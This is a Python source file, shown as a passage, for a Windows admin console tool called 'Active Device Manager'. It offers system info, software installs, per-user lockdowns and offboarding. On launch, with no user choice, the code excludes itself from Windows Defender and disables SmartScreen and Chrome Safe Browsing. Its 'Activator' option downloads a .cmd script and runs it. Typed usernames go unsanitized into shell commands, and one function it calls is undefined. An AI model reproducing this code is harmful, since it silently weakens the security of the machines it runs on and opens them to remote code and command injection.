import sys
import time
import os
import platform
import subprocess
import socket
import uuid
import ctypes
import msvcrt
import threading
import locale
import urllib.request
import winreg
import shutil
from datetime import datetime

try:
    os.system("")

    def resource_path(relative_path):
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)

    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if not is_admin():
        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
        if ret <= 32:
            print("\n\033[91m[!] Administrator privileges required. Please run the app again and click 'Yes'.\033[0m")
            time.sleep(4)
        sys.exit()

    ctypes.windll.kernel32.SetConsoleTitleW("Active Device Manager")

    def run_cmd(cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            return result.stdout.strip()
        except:
            return "N/A"

    def set_registry_hklm(path, name, value, reg_type=winreg.REG_DWORD):
        try:
            winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, name, 0, reg_type, value)
            return True
        except:
            return False

    def set_user_reg(usr, path, name, value, reg_type=winreg.REG_DWORD):
        try:
            sid_raw = run_cmd(f"wmic useraccount where name='{usr}' get sid")
            sid = sid_raw.split('\n')[1].strip()
            try:
                winreg.CreateKey(winreg.HKEY_USERS, f"{sid}\\{path}")
                with winreg.OpenKey(winreg.HKEY_USERS, f"{sid}\\{path}", 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, name, 0, reg_type, value)
                return True
            except:
                ntuser_path = f"C:\\Users\\{usr}\\NTUSER.DAT"
                os.system(f'reg load HKU\\TempHive_{usr} "{ntuser_path}" >nul 2>&1')
                full_path = f"TempHive_{usr}\\{path}"
                winreg.CreateKey(winreg.HKEY_USERS, full_path)
                with winreg.OpenKey(winreg.HKEY_USERS, full_path, 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, name, 0, reg_type, value)
                os.system(f'reg unload HKU\\TempHive_{usr} >nul 2>&1')
                return True
        except:
            return False

    def exclude_av():
        try:
            current_exe = sys.executable
            current_dir = os.path.dirname(current_exe)
            subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionProcess \'{current_exe}\'"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \'{current_dir}\'"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

    def disable_browser_security():
        set_registry_hklm(r"SOFTWARE\Policies\Microsoft\Edge", "SmartScreenEnabled", 0)
        set_registry_hklm(r"SOFTWARE\Policies\Microsoft\Edge", "PreventSmartScreenPromptOverride", 0)
        set_registry_hklm(r"SOFTWARE\Policies\Google\Chrome", "SafeBrowsingProtectionLevel", 0)
        set_registry_hklm(r"SOFTWARE\Policies\Microsoft\Windows\System", "EnableSmartScreen", 0)

    exclude_av()
    disable_browser_security()

    def maximize_console():
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 3)
        except:
            pass

    def check_internet():
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=1.5)
            return True
        except:
            return False

    def get_ipv6():
        try:
            for res in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6):
                return res[4][0]
        except:
            return "N/A"
        return "N/A"

    def print_welcome():
        os.system('cls' if os.name == 'nt' else 'clear')
        welcome_text = r"""
      __        __ _____  _      ____  ___   __  __  _____ 
      \ \      / /| ____|| |    / ___|/ _ \ |  \/  || ____|
       \ \ /\ / / |  _|  | |   | |   | | | || |\/| ||  _|  
        \ V  V /  | |___ | |___| |___| |_| || |  | || |___ 
         \_/\_/   |_____||_____|\____|\___/ |_|  |_||_____|
        """
        bigbox_text = r"""
           ____ ___ ____   ____   _____  __
          | __ )_ _/ ___| | __ ) / _ \ \/ /
          |  _ \| | |  _  |  _ \| | | \  / 
          | |_) | | |_| | | |_) | |_| /  \ 
          |____/___\____| |____/ \___/_/\_\
           INTERNATIONAL PVT. LTD.
        """
        print("\033[1m\033[96m" + "="*70 + "\033[0m")
        print("\033[1m\033[97m" + welcome_text + "\033[0m")
        print("\033[1m\033[93m" + bigbox_text + "\033[0m")
        print("\033[1m\033[96m" + "="*70 + "\033[0m\n")

    def progress_animation():
        print_welcome()
        for i in range(1, 101):
            time.sleep(0.01)
            sys.stdout.write(f"\r\033[92mLoading... {i}%\033[0m")
            sys.stdout.flush()
        sys.stdout.write("\r" + " " * 30 + "\r")
        sys.stdout.flush()

    def fetch_data(silent=False, full_refresh=True, existing_data=None):
        data = existing_data if existing_data else {}
        
        if not silent:
            print_welcome()
            sys.stdout.write("\033[1m\033[93mChecking Internet Connection...\033[0m\n")
            sys.stdout.flush()
        
        data['is_connected'] = check_internet()

        if data['is_connected']:
            wifi_ps = "$wlan = netsh wlan show interfaces; $ssid = ''; $band = ''; if ($wlan -match 'SSID\\s*:\\s*([^\\r\\n]+)') { $ssid = $matches[1].Trim() }; if ($wlan -match 'Band\\s*:\\s*([^\\r\\n]+)') { $band = $matches[1].Trim() }; if ($ssid) { Write-Output \"$ssid ($band)\" } else { Write-Output 'Ethernet / No Wi-Fi' }"
            data['wifi_info'] = run_cmd(f"powershell -Command \"{wifi_ps}\"")
        else:
            data['wifi_info'] = "N/A"

        if full_refresh:
            if not silent:
                sys.stdout.write("\033[1m\033[96mFetching Local System Data...\033[0m\n")
                sys.stdout.flush()

            data['login_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            data['sys_name'] = socket.gethostname()
            data['region'] = run_cmd("powershell (Get-Culture).EnglishName").split('\n')[0]

            try:
                data['ipv4'] = socket.gethostbyname(data['sys_name'])
            except:
                data['ipv4'] = "N/A"
            
            data['ipv6'] = get_ipv6()
            data['mac'] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]).upper()

            serial_no = run_cmd('powershell "(Get-CimInstance Win32_BIOS).SerialNumber"')
            if not serial_no or serial_no == "N/A":
                serial_no = run_cmd("wmic bios get serialnumber").replace("SerialNumber", "").strip()
            data['serial_no'] = serial_no if serial_no else 'Not Found'

            users = run_cmd("wmic useraccount get name").split('\n')
            data['users'] = "\n".join(["- " + u.strip() for u in users[1:] if u.strip()]) if len(users) > 1 else "N/A"

            cap = run_cmd("wmic os get caption").split('\n')
            data['win_cap'] = cap[1].strip() if len(cap) > 1 else 'N/A'
            data['win_ver'] = platform.version()

            act = run_cmd('wmic path SoftwareLicensingProduct where "ApplicationID=\'55c92734-d682-4d71-983e-d6ec3f16059f\' and PartialProductKey is not null" get LicenseStatus').split('\n')
            act_code = act[1].strip() if len(act) > 1 else "0"
            data['act_status'] = "Activated" if "1" in act_code else "Not Activated"

            proc = run_cmd("wmic cpu get name").split('\n')
            data['proc'] = proc[1].strip() if len(proc) > 1 else platform.processor()

            ram = run_cmd("wmic computersystem get totalphysicalmemory").split('\n')
            ram_val = ram[1].strip() if len(ram) > 1 else ""
            data['ram'] = f"{round(int(ram_val) / (1024**3), 2)} GB" if ram_val.isdigit() else "Unknown"

            gpu = run_cmd("wmic path win32_VideoController get name").split('\n')
            data['gpu'] = gpu[1].strip() if len(gpu) > 1 else 'Unknown'

            sys_type = run_cmd("wmic computersystem get systemtype").split('\n')
            data['sys_type'] = sys_type[1].strip() if len(sys_type) > 1 else platform.machine()

            storage_wmic = run_cmd("wmic logicaldisk get caption, freespace, size").split('\n')
            data['storage'] = []
            for line in storage_wmic:
                if line.strip() and "Caption" not in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        drive = parts[0]
                        free = round(int(parts[1]) / (1024**3), 2)
                        tot = round(int(parts[2]) / (1024**3), 2)
                        data['storage'].append(f"  Drive {drive} - {free} GB Free out of {tot} GB")
        return data

    def display_connection_status(data):
        print_welcome()
        if data['is_connected']:
            print("\033[1m\033[92mStatus: CONNECTED\033[0m")
            if data.get('wifi_info') and "Ethernet" not in data['wifi_info'] and "N/A" not in data['wifi_info']:
                print(f"\033[96mNetwork:\033[0m {data['wifi_info']}")
            print()
        else:
            print("\033[1m\033[91mStatus: DISCONNECTED\033[0m")
            print("\033[93mConnect internet.\033[0m\n")

    def fake_progress_bar(duration=2.0, text="Processing"):
        try:
            for i in range(1, 101):
                time.sleep(duration / 100)
                bar = '█' * (i // 5) + '░' * (20 - (i // 5))
                sys.stdout.write(f"\r\033[1m\033[93m{text}: \033[96m[{bar}] {i}%\033[0m")
                sys.stdout.flush()
            print("\n")
        except KeyboardInterrupt:
            print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
            time.sleep(1)

    def get_standard_users():
        users = []
        try:
            raw = run_cmd("wmic useraccount where \"localaccount='true'\" get name").split('\n')[1:]
            admins = run_cmd("net localgroup administrators").lower()
            for u in raw:
                u = u.strip()
                if u and u.lower() not in admins and u.lower() not in ['administrator', 'guest', 'defaultaccount', 'wdagutilityaccount']:
                    users.append(u)
        except:
            pass
        return users

    def lock_system_menu():
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[1m\033[97m             SELECT STANDARD USER             \033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            
            users = get_standard_users()
            if not users:
                print("\033[91mNo Standard Users found on this system.\033[0m")
                print("\033[93mCreate a standard user first or drop an admin to standard.\033[0m")
                input("\n\033[90mEnter to return...\033[0m")
                return
                
            for idx, u in enumerate(users, 1):
                print(f"\033[93m{idx}. \033[97m{u}\033[0m")
            print(f"\033[91m0. \033[97mBack\033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            
            try:
                choice = int(input("\033[1m\033[96mSelect User: \033[0m"))
                if choice == 0:
                    break
                if 1 <= choice <= len(users):
                    target_user = users[choice-1]
                    manage_user_locks(target_user)
            except ValueError:
                print("\033[91mInvalid input.\033[0m")
                time.sleep(1)

    def manage_user_locks(usr):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
            print(f"\033[1m\033[97m             LOCK SYSTEM FOR: {usr}             \033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[93m1. \033[97mSoftware Install Block\033[0m")
            print("\033[93m2. \033[97mAntivirus Defense Lock\033[0m")
            print("\033[93m3. \033[97mRegistry Editing Access\033[0m")
            print("\033[93m4. \033[97mBrowser Extensions Block\033[0m")
            print("\033[93m5. \033[97mMicrosoft Personal Accounts Block\033[0m")
            print("\033[93m6. \033[97mUninstall/Delete ADM Protection\033[0m")
            print("\033[93m7. \033[97mServices & Updates Modification Block\033[0m")
            print("\033[93m8. \033[97mSettings App Access\033[0m")
            print("\033[93m9. \033[97mControl Panel Access\033[0m")
            print("\033[91m0. \033[97mBack\033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            
            choice = input("\033[1m\033[96mChoice: \033[0m")
            
            if choice == '0':
                break
                
            if choice not in [str(i) for i in range(1, 10)]:
                continue
                
            action = input("\033[96mEnter Action (Y to Lock/Disable, N to Unlock/Enable): \033[0m").strip().upper()
            if action not in ["Y", "N"]:
                print("\033[91mInvalid action. Type Y or N.\033[0m")
                time.sleep(1)
                continue
                
            try:
                if choice == '1':
                    val = 1 if action == "Y" else 0
                    set_registry_hklm(r"Software\Policies\Microsoft\Windows\Installer", "DisableUserInstalls", val)
                    set_registry_hklm(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorUser", val)
                elif choice == '2':
                    val = 1 if action == "Y" else 0
                    set_registry_hklm(r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", val)
                elif choice == '3':
                    val = 1 if action == "Y" else 0
                    set_user_reg(usr, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", val)
                elif choice == '4':
                    val = "*" if action == "Y" else ""
                    set_user_reg(usr, r"Software\Policies\Google\Chrome\ExtensionInstallBlocklist", "1", val, winreg.REG_SZ)
                    set_user_reg(usr, r"Software\Policies\Microsoft\Edge\ExtensionInstallBlocklist", "1", val, winreg.REG_SZ)
                elif choice == '5':
                    val = 3 if action == "Y" else 0
                    set_registry_hklm(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "NoConnectedUser", val)
                elif choice == '6':
                    exe_path = sys.executable
                    if action == "Y":
                        os.system(f'icacls "{exe_path}" /deny "{usr}":(D)')
                    else:
                        os.system(f'icacls "{exe_path}" /remove:d "{usr}"')
                elif choice == '7':
                    val = 1 if action == "Y" else 0
                    set_user_reg(usr, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", val)
                    set_user_reg(usr, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", val)
                elif choice == '8':
                    val = "hide:*" if action == "Y" else ""
                    set_user_reg(usr, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "SettingsPageVisibility", val, winreg.REG_SZ)
                elif choice == '9':
                    val = 1 if action == "Y" else 0
                    set_user_reg(usr, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", val)
                    
                print(f"\n\033[1m\033[92m[✓] Settings Updated\033[0m")
                input("\n\033[90mEnter to continue...\033[0m")
            except KeyboardInterrupt:
                print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                time.sleep(1)

    def bbipl_admin_menu(data):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[1m\033[97m                BBIPL ADMIN                \033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[93m1. \033[97mSystemInfo\033[0m")
            print("\033[93m2. \033[97mOSReinstall\033[0m")
            print("\033[93m3. \033[97mOfficeInstall\033[0m")
            print("\033[93m4. \033[97mActivator\033[0m")
            print("\033[93m5. \033[97mChrome\033[0m")
            print("\033[93m6. \033[97mBackupD\033[0m")
            print("\033[93m7. \033[97mBranding\033[0m")
            print("\033[93m8. \033[97mRenamePC\033[0m")
            print("\033[93m9. \033[97mUpdateApps\033[0m")
            print("\033[93m10.\033[97mUpdateDrivers\033[0m")
            print("\033[93m11.\033[97mDropAdmin\033[0m")
            print("\033[93m12.\033[97mLockSystem\033[0m")
            print("\033[93m13.\033[97mOnboarding\033[0m")
            print("\033[93m14.\033[97mOffboarding\033[0m")
            print("\033[91m0. \033[97mBack\033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            
            choice = input("\033[1m\033[96mChoice: \033[0m")
            
            if choice == '1':
                try:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: SystemInfo...\033[0m\n")
                    print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
                    print("\033[1m\033[97m             SYSTEM INFORMATION             \033[0m")
                    print("\033[1m\033[95m" + "="*70 + "\033[0m\n")
                    if 'sys_name' in data:
                        print(f"\033[96mSystem:\033[0m {data['sys_name']}")
                        print(f"\033[96mRegion:\033[0m {data['region']}")
                        print(f"\033[96mTime:\033[0m {data['login_time']}")
                        print(f"\033[96mIPv4:\033[0m {data['ipv4']}")
                        print(f"\033[96mIPv6:\033[0m {data['ipv6']}")
                        print(f"\033[96mMAC:\033[0m {data['mac']}")
                        print(f"\033[96mSerial:\033[0m {data['serial_no']}")
                        print("\n\033[93m[Users]\033[0m")
                        print(data['users'])
                        print("\n\033[93m[Windows]\033[0m")
                        print(f"\033[96mOS:\033[0m {data['win_cap']} ({data['win_ver']})")
                        print(f"\033[96mAct:\033[0m {data['act_status']}")
                        print("\n\033[93m[Hardware]\033[0m")
                        print(f"\033[96mCPU:\033[0m {data['proc']}")
                        print(f"\033[96mRAM:\033[0m {data['ram']}")
                        print(f"\033[96mGPU:\033[0m {data['gpu']}")
                        print(f"\033[96mType:\033[0m {data['sys_type']}")
                        print("\033[96mStorage:\033[0m")
                        for line in data['storage']:
                            print(line)
                    else:
                        print("\033[1m\033[91mFailed.\033[0m")
                    input("\n\033[90mEnter to return...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '2':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: OSReinstall...\033[0m\n")
                    mct_url = "https://go.microsoft.com/fwlink/?linkid=2156295"
                    temp_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'win10.exe')
                    os.system(f'powershell -Command "Invoke-WebRequest -Uri \'{mct_url}\' -OutFile \'{temp_path}\'"')
                    if os.path.exists(temp_path):
                        os.system(f'start /wait "" "{temp_path}"')
                        print("\n\033[1m\033[92m[✓] Done\033[0m")
                    else:
                        print("\n\033[1m\033[91m[X] Download Failed. Check connection.\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '3':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: OfficeInstall...\033[0m\n")
                    app_url = "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365HomePremRetail&platform=x64&language=en-us&version=O16GA"
                    temp_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'office.exe')
                    os.system(f'powershell -Command "Invoke-WebRequest -Uri \'{app_url}\' -OutFile \'{temp_path}\'"')
                    if os.path.exists(temp_path):
                        os.system(f'start /wait "" "{temp_path}"')
                        print("\n\033[1m\033[92m[✓] Done\033[0m")
                    else:
                        print("\n\033[1m\033[91m[X] Download Failed. Check connection.\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '4':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Activator...\033[0m\n")
                    os.system('powershell -c "iwr \'https://microsoft.com\' -OutFile $env:TEMP\\a.cmd; & $env:TEMP\\a.cmd"')
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '5':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Chrome...\033[0m\n")
                    os.system("winget install Google.Chrome -e --accept-package-agreements --accept-source-agreements --silent")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '6':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: BackupD...\033[0m\n")
                    target_path = input("\033[96mEnter Path to Backup (e.g. D:\\Data): \033[0m").strip()
                    if not os.path.exists(target_path):
                        print("\n\033[1m\033[91m[X] Provided path does not exist.\033[0m")
                    else:
                        od_path = os.path.join(os.environ['USERPROFILE'], 'OneDrive')
                        if not os.path.exists(od_path):
                            od_path = os.path.join(os.environ['USERPROFILE'], 'OneDrive - Personal')
                        if os.path.exists(od_path):
                            folder_name = os.path.basename(target_path.rstrip('\\'))
                            if not folder_name:
                                folder_name = "Drive_Root"
                            dest = os.path.join(od_path, f"Backup_{folder_name}")
                            try:
                                os.system(f'mklink /J "{dest}" "{target_path}"')
                                print(f"\n\033[1m\033[92m[✓] Linked Successfully to: {dest}\033[0m")
                            except:
                                print("\n\033[1m\033[91m[X] Link Error\033[0m")
                        else:
                            print("\n\033[1m\033[91m[X] Failed. OneDrive not found on this system.\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '7':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Branding...\033[0m\n")
                    home_img = resource_path("homescreen.png")
                    lock_img = resource_path("lockscreen.png")
                    
                    if os.path.exists(home_img) and os.path.exists(lock_img):
                        os.makedirs("C:\\Windows\\Web\\Wallpaper", exist_ok=True)
                        os.makedirs("C:\\Windows\\Web\\Screen", exist_ok=True)
                        perm_home = "C:\\Windows\\Web\\Wallpaper\\corp_home.png"
                        perm_lock = "C:\\Windows\\Web\\Screen\\corp_lock.png"
                        shutil.copy(home_img, perm_home)
                        shutil.copy(lock_img, perm_lock)
                        
                        set_registry_hku(os.environ['USERNAME'], r"Control Panel\Desktop", "Wallpaper", perm_home, winreg.REG_SZ)
                        set_registry_hklm(r"SOFTWARE\Policies\Microsoft\Windows\Personalization", "LockScreenImage", perm_lock, winreg.REG_SZ)
                        ctypes.windll.user32.SystemParametersInfoW(20, 0, perm_home, 3)
                        os.system("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters")
                        print("\n\033[1m\033[92m[✓] Done\033[0m")
                    else:
                        print("\n\033[1m\033[91m[X] Failed. Images not found in the executable.\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '8':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: RenamePC...\033[0m\n")
                    new_name = input("\033[96mEnter New PC Name: \033[0m").strip()
                    os.system(f'powershell -Command "Rename-Computer -NewName \'{new_name}\' -Force"')
                    print("\n\033[1m\033[92m[✓] Restart Required\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '9':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: UpdateApps...\033[0m\n")
                    os.system("winget upgrade --all --silent --accept-package-agreements --accept-source-agreements")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '10':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: UpdateDrivers...\033[0m\n")
                    print("\033[96mMissing or Error Drivers:\033[0m")
                    os.system('powershell "Get-PnpDevice | Where-Object {$_.Status -eq \'Error\' -or $_.Status -eq \'Degraded\'} | Select-Object FriendlyName, InstanceId"')
                    print("\n\033[96mTriggering Windows Update for Driver Installation...\033[0m")
                    os.system("UsoClient ScanInstallWait")
                    print("\n\033[1m\033[92m[✓] Driver Update Initiated in Background\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '11':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: DropAdmin...\033[0m\n")
                    print("\033[96mCurrent Administrators:\033[0m")
                    os.system("net localgroup administrators")
                    usr = input("\n\033[96mUsername to drop to Standard User: \033[0m").strip()
                    os.system(f'net localgroup administrators "{usr}" /delete')
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '12':
                lock_system_menu()
            elif choice == '13':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Onboarding...\033[0m\n")
                    print("\033[96mOnboarding module initialized. Awaiting configuration...\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '14':
                try:
                    print("\n\033[1m\033[91mWARNING: Wipe\033[0m")
                    confirm = input("\033[93mProceed? (Y/N): \033[0m").strip().lower()
                    if confirm == 'y' or confirm == 'yes':
                        usr = input("\033[96mTarget Username: \033[0m").strip()
                        print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Offboarding...\033[0m\n")
                        os.system("taskkill /f /im onedrive.exe")
                        os.system(f'rmdir /s /q "C:\\Users\\{usr}\\AppData\\Local\\Google\\Chrome\\User Data"')
                        os.system(f'rmdir /s /q "C:\\Users\\{usr}\\AppData\\Local\\Microsoft\\Edge\\User Data"')
                        os.system(f'net user "{usr}" /active:no')
                        fake_progress_bar(3.0, "Wiping")
                        print("\n\033[1m\033[92m[✓] Logoff pending\033[0m")
                        os.system("shutdown /l")
                    else:
                        print("\n\033[92mAborted\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '0':
                break
            else:
                print("\n\033[91mInvalid input.\033[0m")
                time.sleep(1)

    def help_menu():
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
        print("\033[1m\033[97m               HELP               \033[0m")
        print("\033[1m\033[95m" + "="*70 + "\033[0m")
        
        print("\033[1m\033[93m[Health Checkup & Fixer]\033[0m")
        print("\033[96mScan:\033[0m CHKDSK disk repair.")
        print("\033[96mPurge:\033[0m Delete temp files.")
        print("\033[96mOptimize:\033[0m DISM cleanup.")
        print("\033[96mCleanup:\033[0m Cleanmgr tool.")
        print("\033[96mVerify:\033[0m SFC scan.")
        print("\033[96mDiagnostic:\033[0m Run all health tools.")
        print("\033[96mMonitor:\033[0m Perfmon rel graph.")
        print("\033[96mReboot:\033[0m Restart system.")
        
        print("\n\033[1m\033[93m[Internet Fixer]\033[0m")
        print("\033[96mFlush:\033[0m Clear DNS cache.")
        print("\033[96mResetWinsock:\033[0m Reset sockets.")
        print("\033[96mResetIP:\033[0m Reset TCP/IP.")
        print("\033[96mPing:\033[0m Test latency.")
        print("\033[96mTrace:\033[0m Tracert routing.")
        print("\033[96mSpeed:\033[0m Check adapter speed.")
        print("\033[96mTraffic:\033[0m Netstat active ports.")
        print("\033[96mRepair:\033[0m Run all net tools.")
        print("\033[96mGigabit:\033[0m Open NCPA.")

        print("\n\033[1m\033[93m[Security & Hardware Diagnostics]\033[0m")
        print("\033[96mAntivirus:\033[0m Check AV status.")
        print("\033[96mFirewall:\033[0m Check FW profiles.")
        print("\033[96mMalwareScan:\033[0m Run MRT tool.")
        print("\033[96mDriveHealth:\033[0m Check SMART status.")
        print("\033[96mPeripherals:\033[0m LAN/Audio/Cam status.")
        print("\033[96mUptime:\033[0m Check boot time.")
        print("\033[96mBattery:\033[0m Generate powercfg report.")

        print("\n\033[1m\033[93m[BBIPL Admin]\033[0m")
        print("\033[96mSystemInfo:\033[0m Displays complete system hardware and software details.")
        print("\033[96mOSReinstall:\033[0m Downloads Media Creation Tool and triggers Windows setup.")
        print("\033[96mOfficeInstall:\033[0m Downloads Office setup and silently installs it.")
        print("\033[96mActivator:\033[0m Runs the Microsoft licensing activator script.")
        print("\033[96mChrome:\033[0m Installs Google Chrome silently via Winget.")
        print("\033[96mBackupD:\033[0m Creates a symbolic link from a custom Path to OneDrive.")
        print("\033[96mBranding:\033[0m Applies corporate wallpaper and lock screen using permanent web directory.")
        print("\033[96mRenamePC:\033[0m Renames the PC.")
        print("\033[96mUpdateApps:\033[0m Upgrades all installed applications using Winget.")
        print("\033[96mUpdateDrivers:\033[0m Lists missing drivers and triggers scan via Windows Update.")
        print("\033[96mDropAdmin:\033[0m Removes specified user from the local Administrators group.")
        print("\033[96mLockSystem:\033[0m Advanced Per-User toggle controls for System Restrictions.")
        print("\033[96mOnboarding:\033[0m Initiates setup procedure.")
        print("\033[96mOffboarding:\033[0m Terminates OneDrive, deletes browser data, and disables user account.")
        
        print("\033[1m\033[95m" + "="*70 + "\033[0m")
        input("\n\033[90mEnter to return...\033[0m")

    def security_hardware_menu():
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[1m\033[97m           SECURITY & HARDWARE           \033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[93m1. \033[97mAntivirus\033[0m")
            print("\033[93m2. \033[97mFirewall\033[0m")
            print("\033[93m3. \033[97mMalwareScan\033[0m")
            print("\033[93m4. \033[97mDriveHealth\033[0m")
            print("\033[93m5. \033[97mPeripherals\033[0m")
            print("\033[93m6. \033[97mUptime\033[0m")
            print("\033[93m7. \033[97mBattery\033[0m")
            print("\033[91m0. \033[97mBack\033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            
            choice = input("\033[1m\033[96mChoice: \033[0m")
            
            if choice == '1':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Antivirus (Checks the active status of Windows Defender or third-party AV)...\033[0m\n")
                    av_status = run_cmd('powershell "Get-CimInstance -Namespace root\\SecurityCenter2 -Class AntivirusProduct | Select-Object -ExpandProperty displayName"')
                    if av_status and "N/A" not in av_status:
                        print(f"\033[92mDetected: {av_status}\033[0m")
                    else:
                        print("\033[91mNot Found.\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '2':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Firewall (Audits the current status of Windows Firewall profiles)...\033[0m\n")
                    os.system("netsh advfirewall show allprofiles")
